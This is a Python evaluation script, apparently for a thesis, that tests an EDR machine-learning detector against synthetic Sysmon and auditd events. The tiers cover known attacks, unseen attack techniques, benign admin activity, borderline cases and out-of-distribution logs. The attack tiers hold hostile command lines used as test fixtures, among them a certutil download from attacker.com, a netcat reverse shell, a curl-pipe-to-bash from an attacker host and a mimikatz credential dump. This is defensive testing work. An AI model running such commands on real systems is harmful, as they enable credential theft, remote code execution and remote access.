"""Systematic failure-mode probe — find where the honest model breaks.

5 tiers of events:
  1. Mordor-vocab attacks on novel hosts            (expect: ALERT, already proven)
  2. Attack TTPs NOT in Mordor's vocabulary         (expect: maybe miss — generalisation test)
  3. Edge-case benigns (admin tools, dev workflow)  (expect: suppress — FP test)
  4. Adversarial near-collisions                    (expect: graded — discriminative test)
  5. Out-of-distribution sourcetypes (auditd/SMTP)  (expect: probably noise)

Output: tagged verdicts so you can see WHICH categories the model fails on.
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from model_loader import FrozenModel
from feature_row import build_feature_row
import json

MODEL = Path("J:/THESIS-EDR/server/ml-engine/botsv2/models/lgbm_xt_stratified_vanilla_engineered")
m = FrozenModel(MODEL)
THR = m.threshold
print(f"threshold = {THR:.3f}  n_features={len(m.feature_names)}\n")


def sysmon(host, eid, kvs):
    parts = [f"<Event><System><EventID>{eid}</EventID><Computer>{host}</Computer></System><EventData>"]
    for k, v in kvs.items():
        parts.append(f"<Data Name='{k}'>{v}</Data>")
    parts.append("</EventData></Event>")
    return "".join(parts)


def mk(host, eid, kvs, edge="WRITE", obj="FILE"):
    return {"raw_event": sysmon(host, eid, kvs),
            "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
            "edge_type": edge, "subject": {"node_type": "PROCESS"},
            "object": {"node_type": obj}, "endpoint_id": host, "properties": {}}


def mk_auditd(host, cmd, name="x", syscall="execve"):
    raw = (f'type=SYSCALL msg=audit(1716451200.000:1): syscall={syscall} '
           f'pid=4242 auid=1000 uid=1000 tty=pts0 ses=2 comm="bash" exe="/bin/bash" '
           f'proctitle="{cmd}" name="{name}"')
    return {"raw_event": raw, "sourcetype": "auditd", "edge_type": "EXEC",
            "subject": {"node_type": "PROCESS"}, "object": {"node_type": "PROCESS"},
            "endpoint_id": host, "properties": {}}


TIERS = {
    "T1 Mordor-vocab attacks (should ALERT)": [
        ("powershell -enc",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CommandLine": "powershell -enc SQBFAFgA"}, "FORK", "PROCESS")),
        ("mimikatz sekurlsa",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Tools\mimikatz.exe",
                            "CommandLine": "mimikatz sekurlsa::logonpasswords"}, "FORK", "PROCESS")),
        (".crypt write",
         mk("finance", 11, {"ProcessId": "100", "TargetFilename": r"C:\Users\acct\Q3.xlsx.crypt"}, "WRITE")),
        ("winsys32.dll drop",
         mk("corp", 11, {"ProcessId": "100", "TargetFilename": r"C:\Windows\System32\winsys32.dll"}, "WRITE")),
    ],
    "T2 Attack TTPs NOT in Mordor vocab (generalisation test)": [
        (".locked ransomware (not .crypt)",
         mk("hr-pc", 11, {"ProcessId": "100", "TargetFilename": r"C:\Users\hr\report.pdf.locked"}, "WRITE")),
        (".encrypted ransomware",
         mk("hr-pc", 11, {"ProcessId": "100", "TargetFilename": r"C:\Users\hr\contract.encrypted"}, "WRITE")),
        (".pay2decrypt ransomware",
         mk("hr-pc", 11, {"ProcessId": "100", "TargetFilename": r"C:\Users\hr\foo.pay2decrypt"}, "WRITE")),
        ("CobaltStrike beacon.exe drop (unseen file)",
         mk("eng-pc", 11, {"ProcessId": "100", "Image": r"C:\Temp\dropper.exe",
                           "TargetFilename": r"C:\Users\eng\AppData\Roaming\beacon.exe"}, "WRITE")),
        ("Sliver implant write",
         mk("eng-pc", 11, {"ProcessId": "100", "TargetFilename": r"C:\Users\eng\AppData\sliver_agent.exe"}, "WRITE")),
        ("schtasks /create persistence",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\schtasks.exe",
                            "CommandLine": 'schtasks /create /sc minute /tn "evil" /tr c:\\bad.exe'}, "FORK", "PROCESS")),
        ("certutil download (LOLBin)",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\certutil.exe",
                            "CommandLine": "certutil -urlcache -split -f http://attacker.com/x.exe c:\\x.exe"}, "FORK", "PROCESS")),
        ("regsvr32 scrobj DLL hijack",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\regsvr32.exe",
                            "CommandLine": "regsvr32 /s /n /u /i:http://x.com/file.sct scrobj.dll"}, "FORK", "PROCESS")),
    ],
    "T3 Edge-case benigns (should NOT fire)": [
        ("Visual Studio devenv launch",
         mk("dev-pc", 1, {"ProcessId": "100", "Image": r"C:\Program Files\Microsoft Visual Studio\IDE\devenv.exe",
                          "CommandLine": "devenv.exe /run project.sln"}, "FORK", "PROCESS")),
        ("git clone via ssh",
         mk("dev-pc", 1, {"ProcessId": "100", "Image": r"C:\Program Files\Git\bin\git.exe",
                          "CommandLine": "git clone git@github.com:foo/bar.git"}, "FORK", "PROCESS")),
        ("Windows Update svchost",
         mk("any", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\svchost.exe",
                       "CommandLine": "svchost.exe -k netsvcs -p -s wuauserv"}, "FORK", "PROCESS")),
        ("Sysinternals procexp.exe (admin)",
         mk("admin-pc", 1, {"ProcessId": "100", "Image": r"C:\Tools\procexp.exe"}, "FORK", "PROCESS")),
        ("legit PowerShell with -Command",
         mk("admin-pc", 1, {"ProcessId": "100",
                            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CommandLine": "powershell.exe -Command Get-Process | Where-Object {$_.CPU -gt 5}"},
            "FORK", "PROCESS")),
        ("backup.exe writing .docx to backup share",
         mk("backup-server", 11, {"ProcessId": "100", "TargetFilename": r"\\backup\share\file.docx"}, "WRITE")),
        ("Office365 OneDrive sync .exe download",
         mk("alice-pc", 11, {"ProcessId": "100",
                             "TargetFilename": r"C:\Users\alice\OneDrive\Apps\OneDriveSetup.exe"}, "WRITE")),
    ],
    "T4 Adversarial / borderline (graded scores expected)": [
        ("powershell.exe legit usage (-Command Get-Service)",
         mk("alice-pc", 1, {"ProcessId": "100",
                            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CommandLine": "powershell -Command Get-Service"}, "FORK", "PROCESS")),
        ("powershell.exe just -nop -enc (no payload)",
         mk("alice-pc", 1, {"ProcessId": "100",
                            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CommandLine": "powershell -nop -enc V2hvYW1p"}, "FORK", "PROCESS")),
        ("powershell.exe spawn from explorer (suspicious context)",
         mk("alice-pc", 1, {"ProcessId": "100", "ParentImage": r"C:\Windows\explorer.exe",
                            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CommandLine": "powershell"}, "FORK", "PROCESS")),
        ("rundll32 legit (printui)",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\rundll32.exe",
                            "CommandLine": "rundll32 printui.dll,PrintUIEntry /s"}, "FORK", "PROCESS")),
        ("rundll32 sketchy (JS protocol abuse)",
         mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Windows\System32\rundll32.exe",
                            "CommandLine": 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication "'}, "FORK", "PROCESS")),
        ("Word writes .doc.exe (double extension)",
         mk("alice-pc", 11, {"ProcessId": "100",
                             "TargetFilename": r"C:\Users\alice\Downloads\invoice.doc.exe"}, "WRITE")),
        ("Identical attack on a TRAINING host (wrk-btun)",
         mk("wrk-btun", 11, {"ProcessId": "100",
                             "TargetFilename": r"C:\Windows\System32\winsys32.dll"}, "WRITE")),
    ],
    "T5 OOD sourcetypes (auditd, etc — usually noise)": [
        ("auditd mkfifo reverse shell",
         mk_auditd("ubuntu-victim",
                   "bash -c mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f",
                   name="/tmp/f", syscall="mkfifo")),
        ("auditd benign vim",
         mk_auditd("ubuntu-dev", "vim /home/alice/notes.txt", name="/home/alice/notes.txt")),
        ("auditd curl|bash",
         mk_auditd("ubuntu-victim", "curl -s http://attacker/install.sh | bash", name="/tmp/install.sh")),
        ("Sysmon EID=22 DNS query (benign)",
         mk("alice-pc", 22, {"ProcessId": "100", "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe"},
            "ACCESS", "Url")),
        ("Sysmon EID=3 network conn (benign)",
         mk("alice-pc", 3, {"ProcessId": "100", "Image": r"C:\Windows\System32\svchost.exe",
                            "DestinationIp": "8.8.8.8", "DestinationPort": "53"}, "CONNECT", "Socket")),
    ],
}

print(f"{'tier':<55} {'case':<58} {'score':>7} {'verdict':>8}")
print("-" * 132)
totals = {"alert_correct": 0, "alert_wrong": 0, "benign_correct": 0, "benign_wrong": 0}
for tier_name, cases in TIERS.items():
    expect_alert = "should ALERT" in tier_name or "ALERT" in tier_name
    for label, ev in cases:
        row, _ = build_feature_row(ev)
        s = m.predict_proba(row)
        alert = s >= THR
        v = "ALERT" if alert else "benign"
        # Tier 2: ALERT expected (attack); T3: benign expected
        mark = ""
        if tier_name.startswith("T1") or tier_name.startswith("T2"):
            mark = "OK" if alert else "!! MISS"
            totals["alert_correct" if alert else "alert_wrong"] += 1
        elif tier_name.startswith("T3"):
            mark = "OK" if not alert else "!! FP"
            totals["benign_correct" if not alert else "benign_wrong"] += 1
        print(f"{tier_name[:55]:<55} {label:<58} {s:>7.4f} {v:>8} {mark}")
    print()

print(f"Attack-tier recall:  {totals['alert_correct']}/{totals['alert_correct']+totals['alert_wrong']}")
print(f"Benign-tier precision: {totals['benign_correct']}/{totals['benign_correct']+totals['benign_wrong']}")
